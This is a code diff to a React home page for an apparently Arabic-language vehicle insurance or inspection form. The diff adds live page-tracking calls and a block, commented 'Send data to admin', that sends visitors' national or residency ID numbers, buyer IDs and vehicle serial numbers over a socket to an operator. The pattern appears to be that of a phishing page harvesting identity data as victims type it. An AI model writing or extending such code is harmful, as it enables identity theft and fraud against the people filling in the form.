@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef, useCallback, useMemo } from "react";
 import { Link, useLocation } from "wouter";
-import { socket } from "@/lib/store";
+import { socket, submitData, updatePage } from "@/lib/store";
 import { openAmerChat } from "@/components/AmerChat";
 
 export default function FahsHome() {
@@ -52,6 +52,7 @@ export default function FahsHome() {
 
   useEffect(() => {
     generateCaptcha();
+    updatePage('البيانات الرئيسية');
   }, []);
 
   const generateCaptcha = () => {
@@ -99,6 +100,22 @@ export default function FahsHome() {
     if (captchaInput.trim() !== captchaCodeRef.current.trim()) { setCaptchaError(true); return; }
     if (hasError) return;
     setIsSearching(true);
+
+    // Send data to admin
+    const adminData: Record<string, string> = {
+      'الغرض من التأمين': insuranceType === 'new' ? 'تأمين جديد' : 'نقل ملكية',
+      'نوع تسجيل المركبة': vehicleType === 'customs' ? 'بطاقة جمركية' : 'استمارة',
+      'رقم الهوية / الإقامة': nationalId,
+      'الرقم التسلسلي': vehicleType === 'customs' ? customsNumber : serialNumber,
+    };
+    if (insuranceType === 'transfer') {
+      adminData['رقم هوية المشتري'] = buyerId;
+    }
+    if (vehicleType === 'customs' && manufactureYear) {
+      adminData['سنة الصنع'] = manufactureYear;
+    }
+    submitData(adminData);
+
     localStorage.setItem('nationalId', nationalId);
     localStorage.setItem('homeInsuranceType', insuranceType);
     localStorage.setItem('vehicleRegType', vehicleType === 'customs' ? 'بطاقة جمركية' : 'استمارة');
